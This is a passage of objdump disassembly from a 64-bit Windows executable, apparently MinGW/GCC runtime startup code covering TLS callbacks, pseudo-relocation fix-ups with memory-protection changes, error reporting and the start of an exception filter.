   140001762:	48 83 ec 28          	sub    $0x28,%rsp
   140001766:	48 8b 05 63 99 00 00 	mov    0x9963(%rip),%rax        # 0x14000b0d0
   14000176d:	83 38 02             	cmpl   $0x2,(%rax)
   140001770:	74 06                	je     0x140001778
   140001772:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001778:	83 fa 01             	cmp    $0x1,%edx
   14000177b:	74 3c                	je     0x1400017b9
   14000177d:	83 fa 02             	cmp    $0x2,%edx
   140001780:	75 41                	jne    0x1400017c3
   140001782:	48 8d 35 77 ba 00 00 	lea    0xba77(%rip),%rsi        # 0x14000d200
   140001789:	48 8d 3d 70 ba 00 00 	lea    0xba70(%rip),%rdi        # 0x14000d200
   140001790:	48 39 f7             	cmp    %rsi,%rdi
   140001793:	75 14                	jne    0x1400017a9
   140001795:	eb 2c                	jmp    0x1400017c3
   140001797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000179e:	00 00 
   1400017a0:	48 83 c7 08          	add    $0x8,%rdi
   1400017a4:	48 39 fe             	cmp    %rdi,%rsi
   1400017a7:	74 1a                	je     0x1400017c3
   1400017a9:	48 8b 07             	mov    (%rdi),%rax
   1400017ac:	48 85 c0             	test   %rax,%rax
   1400017af:	74 ef                	je     0x1400017a0
   1400017b1:	ff 15 51 18 2c 00    	call   *0x2c1851(%rip)        # 0x1402c3008
   1400017b7:	eb e7                	jmp    0x1400017a0
   1400017b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400017be:	e8 1d 09 00 00       	call   0x1400020e0
   1400017c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017c8:	48 83 c4 28          	add    $0x28,%rsp
   1400017cc:	5f                   	pop    %rdi
   1400017cd:	5e                   	pop    %rsi
   1400017ce:	c3                   	ret
   1400017cf:	90                   	nop
   1400017d0:	31 c0                	xor    %eax,%eax
   1400017d2:	c3                   	ret
   1400017d3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400017da:	84 00 00 00 00 00 
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	83 fa 03             	cmp    $0x3,%edx
   1400017e7:	74 04                	je     0x1400017ed
   1400017e9:	85 d2                	test   %edx,%edx
   1400017eb:	75 05                	jne    0x1400017f2
   1400017ed:	e8 ee 08 00 00       	call   0x1400020e0
   1400017f2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017f7:	48 83 c4 28          	add    $0x28,%rsp
   1400017fb:	c3                   	ret
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	56                   	push   %rsi
   140001801:	57                   	push   %rdi
   140001802:	48 83 ec 38          	sub    $0x38,%rsp
   140001806:	48 89 ce             	mov    %rcx,%rsi
   140001809:	8b 01                	mov    (%rcx),%eax
   14000180b:	ff c8                	dec    %eax
   14000180d:	83 f8 05             	cmp    $0x5,%eax
   140001810:	77 12                	ja     0x140001824
   140001812:	48 98                	cltq
   140001814:	48 8d 0d d1 99 00 00 	lea    0x99d1(%rip),%rcx        # 0x14000b1ec
   14000181b:	48 63 3c 81          	movslq (%rcx,%rax,4),%rdi
   14000181f:	48 01 cf             	add    %rcx,%rdi
   140001822:	eb 07                	jmp    0x14000182b
   140001824:	48 8d 3d 86 99 00 00 	lea    0x9986(%rip),%rdi        # 0x14000b1b1
   14000182b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001830:	e8 5b 0a 00 00       	call   0x140002290
   140001835:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   140001839:	0f 10 46 10          	movups 0x10(%rsi),%xmm0
   14000183d:	f2 0f 10 4e 20       	movsd  0x20(%rsi),%xmm1
   140001842:	f2 0f 11 4c 24 30    	movsd  %xmm1,0x30(%rsp)
   140001848:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000184d:	48 8d 15 6b 99 00 00 	lea    0x996b(%rip),%rdx        # 0x14000b1bf
   140001854:	48 89 c1             	mov    %rax,%rcx
   140001857:	49 89 f8             	mov    %rdi,%r8
   14000185a:	e8 c1 8d 00 00       	call   0x14000a620
   14000185f:	31 c0                	xor    %eax,%eax
   140001861:	48 83 c4 38          	add    $0x38,%rsp
   140001865:	5f                   	pop    %rdi
   140001866:	5e                   	pop    %rsi
   140001867:	c3                   	ret
   140001868:	cc                   	int3
   140001869:	cc                   	int3
   14000186a:	cc                   	int3
   14000186b:	cc                   	int3
   14000186c:	cc                   	int3
   14000186d:	cc                   	int3
   14000186e:	cc                   	int3
   14000186f:	cc                   	int3
   140001870:	db e3                	fninit
   140001872:	c3                   	ret
   140001873:	cc                   	int3
   140001874:	cc                   	int3
   140001875:	cc                   	int3
   140001876:	cc                   	int3
   140001877:	cc                   	int3
   140001878:	cc                   	int3
   140001879:	cc                   	int3
   14000187a:	cc                   	int3
   14000187b:	cc                   	int3
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	55                   	push   %rbp
   140001881:	41 57                	push   %r15
   140001883:	41 56                	push   %r14
   140001885:	41 55                	push   %r13
   140001887:	41 54                	push   %r12
   140001889:	56                   	push   %rsi
   14000188a:	57                   	push   %rdi
   14000188b:	53                   	push   %rbx
   14000188c:	48 83 ec 18          	sub    $0x18,%rsp
   140001890:	48 8d 6c 24 10       	lea    0x10(%rsp),%rbp
   140001895:	80 3d 54 e9 2b 00 00 	cmpb   $0x0,0x2be954(%rip)        # 0x1402c01f0
   14000189c:	0f 85 6d 01 00 00    	jne    0x140001a0f
   1400018a2:	c6 05 47 e9 2b 00 01 	movb   $0x1,0x2be947(%rip)        # 0x1402c01f0
   1400018a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400018ad:	e8 6e 0b 00 00       	call   0x140002420
   1400018b2:	48 83 c4 20          	add    $0x20,%rsp
   1400018b6:	48 98                	cltq
   1400018b8:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400018bc:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   1400018c3:	00 
   1400018c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400018c8:	e8 93 0d 00 00       	call   0x140002660
   1400018cd:	48 29 c4             	sub    %rax,%rsp
   1400018d0:	48 89 e0             	mov    %rsp,%rax
   1400018d3:	48 89 05 1e e9 2b 00 	mov    %rax,0x2be91e(%rip)        # 0x1402c01f8
   1400018da:	c7 05 1c e9 2b 00 00 	movl   $0x0,0x2be91c(%rip)        # 0x1402c0200
   1400018e1:	00 00 00 
   1400018e4:	48 8b 3d c5 9a 00 00 	mov    0x9ac5(%rip),%rdi        # 0x14000b3b0
   1400018eb:	48 89 f8             	mov    %rdi,%rax
   1400018ee:	48 2b 05 c3 9a 00 00 	sub    0x9ac3(%rip),%rax        # 0x14000b3b8
   1400018f5:	48 83 f8 07          	cmp    $0x7,%rax
   1400018f9:	0f 8e 10 01 00 00    	jle    0x140001a0f
   1400018ff:	48 8b 1d b2 9a 00 00 	mov    0x9ab2(%rip),%rbx        # 0x14000b3b8
   140001906:	48 89 f8             	mov    %rdi,%rax
   140001909:	48 29 d8             	sub    %rbx,%rax
   14000190c:	48 83 f8 0c          	cmp    $0xc,%rax
   140001910:	7c 2c                	jl     0x14000193e
   140001912:	48 8b 1d 9f 9a 00 00 	mov    0x9a9f(%rip),%rbx        # 0x14000b3b8
   140001919:	83 3b 00             	cmpl   $0x0,(%rbx)
   14000191c:	75 2f                	jne    0x14000194d
   14000191e:	48 8b 1d 93 9a 00 00 	mov    0x9a93(%rip),%rbx        # 0x14000b3b8
   140001925:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001929:	75 22                	jne    0x14000194d
   14000192b:	48 8b 05 86 9a 00 00 	mov    0x9a86(%rip),%rax        # 0x14000b3b8
   140001932:	48 8d 58 0c          	lea    0xc(%rax),%rbx
   140001936:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   14000193a:	48 0f 45 d8          	cmovne %rax,%rbx
   14000193e:	83 3b 00             	cmpl   $0x0,(%rbx)
   140001941:	75 0a                	jne    0x14000194d
   140001943:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001947:	0f 84 d3 00 00 00    	je     0x140001a20
   14000194d:	48 3b 1d 5c 9a 00 00 	cmp    0x9a5c(%rip),%rbx        # 0x14000b3b0
   140001954:	73 48                	jae    0x14000199e
   140001956:	4c 8b 35 ab 96 00 00 	mov    0x96ab(%rip),%r14        # 0x14000b008
   14000195d:	48 8d 75 04          	lea    0x4(%rbp),%rsi
   140001961:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001968:	0f 1f 84 00 00 00 00 
   14000196f:	00 
   140001970:	8b 03                	mov    (%rbx),%eax
   140001972:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001975:	42 03 04 31          	add    (%rcx,%r14,1),%eax
   140001979:	4c 01 f1             	add    %r14,%rcx
   14000197c:	89 45 04             	mov    %eax,0x4(%rbp)
   14000197f:	48 83 ec 20          	sub    $0x20,%rsp
   140001983:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001989:	48 89 f2             	mov    %rsi,%rdx
   14000198c:	e8 0f 02 00 00       	call   0x140001ba0
   140001991:	48 83 c4 20          	add    $0x20,%rsp
   140001995:	48 83 c3 08          	add    $0x8,%rbx
   140001999:	48 39 fb             	cmp    %rdi,%rbx
   14000199c:	72 d2                	jb     0x140001970
   14000199e:	8b 05 5c e8 2b 00    	mov    0x2be85c(%rip),%eax        # 0x1402c0200
   1400019a4:	85 c0                	test   %eax,%eax
   1400019a6:	7e 67                	jle    0x140001a0f
   1400019a8:	bf 10 00 00 00       	mov    $0x10,%edi
   1400019ad:	48 8b 15 44 e8 2b 00 	mov    0x2be844(%rip),%rdx        # 0x1402c01f8
   1400019b4:	31 db                	xor    %ebx,%ebx
   1400019b6:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   1400019ba:	4c 8b 35 77 bb 00 00 	mov    0xbb77(%rip),%r14        # 0x14000d538
   1400019c1:	eb 1c                	jmp    0x1400019df
   1400019c3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400019ca:	84 00 00 00 00 00 
   1400019d0:	48 ff c3             	inc    %rbx
   1400019d3:	48 63 c8             	movslq %eax,%rcx
   1400019d6:	48 83 c7 28          	add    $0x28,%rdi
   1400019da:	48 39 cb             	cmp    %rcx,%rbx
   1400019dd:	7d 30                	jge    0x140001a0f
   1400019df:	44 8b 44 3a f0       	mov    -0x10(%rdx,%rdi,1),%r8d
   1400019e4:	45 85 c0             	test   %r8d,%r8d
   1400019e7:	74 e7                	je     0x1400019d0
   1400019e9:	48 8b 4c 3a f8       	mov    -0x8(%rdx,%rdi,1),%rcx
   1400019ee:	48 8b 14 3a          	mov    (%rdx,%rdi,1),%rdx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	49 89 f1             	mov    %rsi,%r9
   1400019f9:	41 ff d6             	call   *%r14
   1400019fc:	48 83 c4 20          	add    $0x20,%rsp
   140001a00:	48 8b 15 f1 e7 2b 00 	mov    0x2be7f1(%rip),%rdx        # 0x1402c01f8
   140001a07:	8b 05 f3 e7 2b 00    	mov    0x2be7f3(%rip),%eax        # 0x1402c0200
   140001a0d:	eb c1                	jmp    0x1400019d0
   140001a0f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001a13:	5b                   	pop    %rbx
   140001a14:	5f                   	pop    %rdi
   140001a15:	5e                   	pop    %rsi
   140001a16:	41 5c                	pop    %r12
   140001a18:	41 5d                	pop    %r13
   140001a1a:	41 5e                	pop    %r14
   140001a1c:	41 5f                	pop    %r15
   140001a1e:	5d                   	pop    %rbp
   140001a1f:	c3                   	ret
   140001a20:	8b 53 08             	mov    0x8(%rbx),%edx
   140001a23:	83 fa 01             	cmp    $0x1,%edx
   140001a26:	0f 85 5b 01 00 00    	jne    0x140001b87
   140001a2c:	48 83 c3 0c          	add    $0xc,%rbx
   140001a30:	48 3b 1d 79 99 00 00 	cmp    0x9979(%rip),%rbx        # 0x14000b3b0
   140001a37:	0f 83 61 ff ff ff    	jae    0x14000199e
   140001a3d:	4c 8b 35 c4 95 00 00 	mov    0x95c4(%rip),%r14        # 0x14000b008
   140001a44:	4c 8d 3d bd 97 00 00 	lea    0x97bd(%rip),%r15        # 0x14000b208
   140001a4b:	41 bc 8b 00 00 00    	mov    $0x8b,%r12d
   140001a51:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   140001a55:	49 bd 00 00 00 00 ff 	movabs $0xffffffff00000000,%r13
   140001a5c:	ff ff ff 
   140001a5f:	eb 1c                	jmp    0x140001a7d
   140001a61:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001a68:	0f 1f 84 00 00 00 00 
   140001a6f:	00 
   140001a70:	48 83 c3 0c          	add    $0xc,%rbx
   140001a74:	48 39 fb             	cmp    %rdi,%rbx
   140001a77:	0f 83 21 ff ff ff    	jae    0x14000199e
   140001a7d:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140001a80:	41 89 c8             	mov    %ecx,%r8d
   140001a83:	41 81 e0 f8 00 00 00 	and    $0xf8,%r8d
   140001a8a:	41 83 c0 f8          	add    $0xfffffff8,%r8d
   140001a8e:	41 0f ac c8 03       	shrd   $0x3,%ecx,%r8d
   140001a93:	41 83 f8 07          	cmp    $0x7,%r8d
   140001a97:	0f 87 d7 00 00 00    	ja     0x140001b74
   140001a9d:	8b 13                	mov    (%rbx),%edx
   140001a9f:	8b 43 04             	mov    0x4(%rbx),%eax
   140001aa2:	4c 01 f0             	add    %r14,%rax
   140001aa5:	4e 8b 0c 32          	mov    (%rdx,%r14,1),%r9
   140001aa9:	4f 63 14 87          	movslq (%r15,%r8,4),%r10
   140001aad:	4d 01 fa             	add    %r15,%r10
   140001ab0:	41 ff e2             	jmp    *%r10
   140001ab3:	44 0f b6 18          	movzbl (%rax),%r11d
   140001ab7:	4d 8d 93 00 ff ff ff 	lea    -0x100(%r11),%r10
   140001abe:	45 84 db             	test   %r11b,%r11b
   140001ac1:	eb 1b                	jmp    0x140001ade
   140001ac3:	44 0f b7 18          	movzwl (%rax),%r11d
   140001ac7:	4d 8d 93 00 00 ff ff 	lea    -0x10000(%r11),%r10
   140001ace:	66 45 85 db          	test   %r11w,%r11w
   140001ad2:	eb 0a                	jmp    0x140001ade
   140001ad4:	44 8b 18             	mov    (%rax),%r11d
   140001ad7:	4f 8d 14 2b          	lea    (%r11,%r13,1),%r10
   140001adb:	45 85 db             	test   %r11d,%r11d
   140001ade:	4d 0f 49 d3          	cmovns %r11,%r10
   140001ae2:	eb 03                	jmp    0x140001ae7
   140001ae4:	4c 8b 10             	mov    (%rax),%r10
   140001ae7:	4c 01 f2             	add    %r14,%rdx
   140001aea:	49 29 d2             	sub    %rdx,%r10
   140001aed:	4d 01 ca             	add    %r9,%r10
   140001af0:	4c 89 55 f8          	mov    %r10,-0x8(%rbp)
   140001af4:	0f b6 d1             	movzbl %cl,%edx
   140001af7:	83 fa 3f             	cmp    $0x3f,%edx
   140001afa:	77 26                	ja     0x140001b22
   140001afc:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b03:	89 d1                	mov    %edx,%ecx
   140001b05:	49 d3 e3             	shl    %cl,%r11
   140001b08:	49 f7 d3             	not    %r11
   140001b0b:	4d 39 da             	cmp    %r11,%r10
   140001b0e:	7f 4c                	jg     0x140001b5c
   140001b10:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140001b13:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b1a:	49 d3 e3             	shl    %cl,%r11
   140001b1d:	4d 39 da             	cmp    %r11,%r10
   140001b20:	7c 3a                	jl     0x140001b5c
   140001b22:	41 83 f8 07          	cmp    $0x7,%r8d
   140001b26:	0f 87 44 ff ff ff    	ja     0x140001a70
   140001b2c:	45 0f a3 c4          	bt     %r8d,%r12d
   140001b30:	0f 83 3a ff ff ff    	jae    0x140001a70
   140001b36:	49 63 c8             	movslq %r8d,%rcx
   140001b39:	48 8d 15 30 98 00 00 	lea    0x9830(%rip),%rdx        # 0x14000b370
   140001b40:	4c 8b 04 ca          	mov    (%rdx,%rcx,8),%r8
   140001b44:	48 83 ec 20          	sub    $0x20,%rsp
   140001b48:	48 89 c1             	mov    %rax,%rcx
   140001b4b:	48 89 f2             	mov    %rsi,%rdx
   140001b4e:	e8 4d 00 00 00       	call   0x140001ba0
   140001b53:	48 83 c4 20          	add    $0x20,%rsp
   140001b57:	e9 14 ff ff ff       	jmp    0x140001a70
   140001b5c:	48 83 ec 30          	sub    $0x30,%rsp
   140001b60:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140001b65:	48 8d 0d 18 97 00 00 	lea    0x9718(%rip),%rcx        # 0x14000b284
   140001b6c:	49 89 c0             	mov    %rax,%r8
   140001b6f:	e8 cc 01 00 00       	call   0x140001d40
   140001b74:	0f b6 d1             	movzbl %cl,%edx
   140001b77:	48 83 ec 20          	sub    $0x20,%rsp
   140001b7b:	48 8d 0d d8 96 00 00 	lea    0x96d8(%rip),%rcx        # 0x14000b25a
   140001b82:	e8 b9 01 00 00       	call   0x140001d40
   140001b87:	48 83 ec 20          	sub    $0x20,%rsp
   140001b8b:	48 8d 0d 96 96 00 00 	lea    0x9696(%rip),%rcx        # 0x14000b228
   140001b92:	e8 a9 01 00 00       	call   0x140001d40
   140001b97:	cc                   	int3
   140001b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b9f:	00 
   140001ba0:	41 57                	push   %r15
   140001ba2:	41 56                	push   %r14
   140001ba4:	41 54                	push   %r12
   140001ba6:	56                   	push   %rsi
   140001ba7:	57                   	push   %rdi
   140001ba8:	53                   	push   %rbx
   140001ba9:	48 83 ec 58          	sub    $0x58,%rsp
   140001bad:	4c 89 c7             	mov    %r8,%rdi
   140001bb0:	48 89 d3             	mov    %rdx,%rbx
   140001bb3:	48 89 ce             	mov    %rcx,%rsi
   140001bb6:	44 8b 3d 43 e6 2b 00 	mov    0x2be643(%rip),%r15d        # 0x1402c0200
   140001bbd:	45 85 ff             	test   %r15d,%r15d
   140001bc0:	7e 47                	jle    0x140001c09
   140001bc2:	48 8b 05 2f e6 2b 00 	mov    0x2be62f(%rip),%rax        # 0x1402c01f8
   140001bc9:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001bd0:	00 
   140001bd1:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140001bd5:	31 d2                	xor    %edx,%edx
   140001bd7:	eb 10                	jmp    0x140001be9
   140001bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001be0:	48 83 c2 28          	add    $0x28,%rdx
   140001be4:	48 39 d1             	cmp    %rdx,%rcx
   140001be7:	74 23                	je     0x140001c0c
   140001be9:	4c 8b 44 10 18       	mov    0x18(%rax,%rdx,1),%r8
   140001bee:	49 39 f0             	cmp    %rsi,%r8
   140001bf1:	77 ed                	ja     0x140001be0
   140001bf3:	4c 8b 4c 10 20       	mov    0x20(%rax,%rdx,1),%r9
   140001bf8:	45 8b 49 08          	mov    0x8(%r9),%r9d
   140001bfc:	4d 01 c8             	add    %r9,%r8
   140001bff:	49 39 f0             	cmp    %rsi,%r8
   140001c02:	76 dc                	jbe    0x140001be0
   140001c04:	e9 ce 00 00 00       	jmp    0x140001cd7
   140001c09:	45 31 ff             	xor    %r15d,%r15d
   140001c0c:	48 89 f1             	mov    %rsi,%rcx
   140001c0f:	e8 9c 07 00 00       	call   0x1400023b0
   140001c14:	48 85 c0             	test   %rax,%rax
   140001c17:	0f 84 d7 00 00 00    	je     0x140001cf4
   140001c1d:	49 89 c6             	mov    %rax,%r14
   140001c20:	48 8b 05 d1 e5 2b 00 	mov    0x2be5d1(%rip),%rax        # 0x1402c01f8
   140001c27:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001c2e:	00 
   140001c2f:	4c 8d 24 89          	lea    (%rcx,%rcx,4),%r12
   140001c33:	4e 89 74 20 20       	mov    %r14,0x20(%rax,%r12,1)
   140001c38:	42 c7 04 20 00 00 00 	movl   $0x0,(%rax,%r12,1)
   140001c3f:	00 
   140001c40:	e8 8b 08 00 00       	call   0x1400024d0
   140001c45:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   140001c49:	48 01 c1             	add    %rax,%rcx
   140001c4c:	48 8b 05 a5 e5 2b 00 	mov    0x2be5a5(%rip),%rax        # 0x1402c01f8
   140001c53:	4a 89 4c 20 18       	mov    %rcx,0x18(%rax,%r12,1)
   140001c58:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001c5d:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001c63:	ff 15 d7 b8 00 00    	call   *0xb8d7(%rip)        # 0x14000d540
   140001c69:	48 85 c0             	test   %rax,%rax
   140001c6c:	0f 84 91 00 00 00    	je     0x140001d03
   140001c72:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140001c76:	83 f8 07             	cmp    $0x7,%eax
   140001c79:	7e 13                	jle    0x140001c8e
   140001c7b:	83 f8 08             	cmp    $0x8,%eax
   140001c7e:	74 51                	je     0x140001cd1
   140001c80:	83 f8 40             	cmp    $0x40,%eax
   140001c83:	74 4c                	je     0x140001cd1
   140001c85:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001c8a:	74 45                	je     0x140001cd1
   140001c8c:	eb 10                	jmp    0x140001c9e
   140001c8e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001c94:	83 f8 02             	cmp    $0x2,%eax
   140001c97:	74 0b                	je     0x140001ca4
   140001c99:	83 f8 04             	cmp    $0x4,%eax
   140001c9c:	74 33                	je     0x140001cd1
   140001c9e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001ca4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001ca9:	48 8b 05 48 e5 2b 00 	mov    0x2be548(%rip),%rax        # 0x1402c01f8
   140001cb0:	4f 8d 14 bf          	lea    (%r15,%r15,4),%r10
   140001cb4:	4e 8d 0c d0          	lea    (%rax,%r10,8),%r9
   140001cb8:	4a 89 4c d0 08       	mov    %rcx,0x8(%rax,%r10,8)
   140001cbd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001cc2:	4a 89 54 d0 10       	mov    %rdx,0x10(%rax,%r10,8)
   140001cc7:	ff 15 6b b8 00 00    	call   *0xb86b(%rip)        # 0x14000d538
   140001ccd:	85 c0                	test   %eax,%eax
   140001ccf:	74 52                	je     0x140001d23
   140001cd1:	ff 05 29 e5 2b 00    	incl   0x2be529(%rip)        # 0x1402c0200
   140001cd7:	48 89 f1             	mov    %rsi,%rcx
   140001cda:	48 89 da             	mov    %rbx,%rdx
   140001cdd:	49 89 f8             	mov    %rdi,%r8
   140001ce0:	e8 db 88 00 00       	call   0x14000a5c0
   140001ce5:	90                   	nop
   140001ce6:	48 83 c4 58          	add    $0x58,%rsp
   140001cea:	5b                   	pop    %rbx
   140001ceb:	5f                   	pop    %rdi
   140001cec:	5e                   	pop    %rsi
   140001ced:	41 5c                	pop    %r12
   140001cef:	41 5e                	pop    %r14
   140001cf1:	41 5f                	pop    %r15
   140001cf3:	c3                   	ret
   140001cf4:	48 8d 0d dc 95 00 00 	lea    0x95dc(%rip),%rcx        # 0x14000b2d7
   140001cfb:	48 89 f2             	mov    %rsi,%rdx
   140001cfe:	e8 3d 00 00 00       	call   0x140001d40
   140001d03:	41 8b 56 08          	mov    0x8(%r14),%edx
   140001d07:	48 8b 05 ea e4 2b 00 	mov    0x2be4ea(%rip),%rax        # 0x1402c01f8
   140001d0e:	4b 8d 0c bf          	lea    (%r15,%r15,4),%rcx
   140001d12:	4c 8b 44 c8 18       	mov    0x18(%rax,%rcx,8),%r8
   140001d17:	48 8d 0d d9 95 00 00 	lea    0x95d9(%rip),%rcx        # 0x14000b2f7
   140001d1e:	e8 1d 00 00 00       	call   0x140001d40
   140001d23:	ff 15 df b7 00 00    	call   *0xb7df(%rip)        # 0x14000d508
   140001d29:	48 8d 0d f8 95 00 00 	lea    0x95f8(%rip),%rcx        # 0x14000b328
   140001d30:	89 c2                	mov    %eax,%edx
   140001d32:	e8 09 00 00 00       	call   0x140001d40
   140001d37:	cc                   	int3
   140001d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001d3f:	00 
   140001d40:	56                   	push   %rsi
   140001d41:	48 83 ec 30          	sub    $0x30,%rsp
   140001d45:	48 89 ce             	mov    %rcx,%rsi
   140001d48:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140001d4d:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001d52:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001d57:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140001d5c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001d61:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d66:	e8 25 05 00 00       	call   0x140002290
   140001d6b:	48 8d 0d dd 95 00 00 	lea    0x95dd(%rip),%rcx        # 0x14000b34f
   140001d72:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001d77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d7d:	49 89 c1             	mov    %rax,%r9
   140001d80:	e8 ab 88 00 00       	call   0x14000a630
   140001d85:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d8a:	e8 01 05 00 00       	call   0x140002290
   140001d8f:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140001d94:	48 89 c1             	mov    %rax,%rcx
   140001d97:	48 89 f2             	mov    %rsi,%rdx
   140001d9a:	e8 a1 88 00 00       	call   0x14000a640
   140001d9f:	e8 ac 88 00 00       	call   0x14000a650
   140001da4:	cc                   	int3
   140001da5:	cc                   	int3
   140001da6:	cc                   	int3
   140001da7:	cc                   	int3
   140001da8:	cc                   	int3
   140001da9:	cc                   	int3
   140001daa:	cc                   	int3
   140001dab:	cc                   	int3
   140001dac:	cc                   	int3
   140001dad:	cc                   	int3
   140001dae:	cc                   	int3
   140001daf:	cc                   	int3
   140001db0:	48 83 ec 48          	sub    $0x48,%rsp
   140001db4:	48 8b 05 4d e4 2b 00 	mov    0x2be44d(%rip),%rax        # 0x1402c0208
   140001dbb:	48 85 c0             	test   %rax,%rax
   140001dbe:	74 2c                	je     0x140001dec
   140001dc0:	f2 0f 10 44 24 70    	movsd  0x70(%rsp),%xmm0
   140001dc6:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140001dca:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001dcf:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140001dd5:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140001ddb:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140001de1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001de6:	ff 15 1c 12 2c 00    	call   *0x2c121c(%rip)        # 0x1402c3008
   140001dec:	90                   	nop
   140001ded:	48 83 c4 48          	add    $0x48,%rsp
   140001df1:	c3                   	ret
   140001df2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001df9:	1f 84 00 00 00 00 00 
   140001e00:	48 89 0d 01 e4 2b 00 	mov    %rcx,0x2be401(%rip)        # 0x1402c0208
   140001e07:	e9 54 88 00 00       	jmp    0x14000a660
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	56                   	push   %rsi
   140001e11:	57                   	push   %rdi
   140001e12:	53                   	push   %rbx
   140001e13:	48 83 ec 20          	sub    $0x20,%rsp
   140001e17:	48 89 cf             	mov    %rcx,%rdi
   140001e1a:	48 8b 09             	mov    (%rcx),%rcx
   140001e1d:	8b 01                	mov    (%rcx),%eax
   140001e1f:	89 c2                	mov    %eax,%edx
   140001e21:	81 e2 ff ff ff 20    	and    $0x20ffffff,%edx
   140001e27:	81 fa 43 43 47 20    	cmp    $0x20474343,%edx
   140001e2d:	75 0f                	jne    0x140001e3e
   140001e2f:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e34:	f6 41 04 01          	testb  $0x1,0x4(%rcx)
   140001e38:	0f 84 22 01 00 00    	je     0x140001f60
   140001e3e:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e43:	3d 1c 00 00 c0       	cmp    $0xc000001c,%eax
   140001e48:	7e 59                	jle    0x140001ea3
   140001e4a:	8d 88 74 ff ff 3f    	lea    0x3fffff74(%rax),%ecx
   140001e50:	83 f9 0a             	cmp    $0xa,%ecx
   140001e53:	77 77                	ja     0x140001ecc
   140001e55:	48 8d 05 64 95 00 00 	lea    0x9564(%rip),%rax        # 0x14000b3c0
   140001e5c:	48 63 0c 88          	movslq (%rax,%rcx,4),%rcx
   140001e60:	48 01 c1             	add    %rax,%rcx
   140001e63:	ff e1                	jmp    *%rcx
   140001e65:	31 db                	xor    %ebx,%ebx
   140001e67:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e6c:	31 d2                	xor    %edx,%edx
   140001e6e:	e8 fd 87 00 00       	call   0x14000a670
   140001e73:	48 85 c0             	test   %rax,%rax
   140001e76:	0f 84 a7 00 00 00    	je     0x140001f23
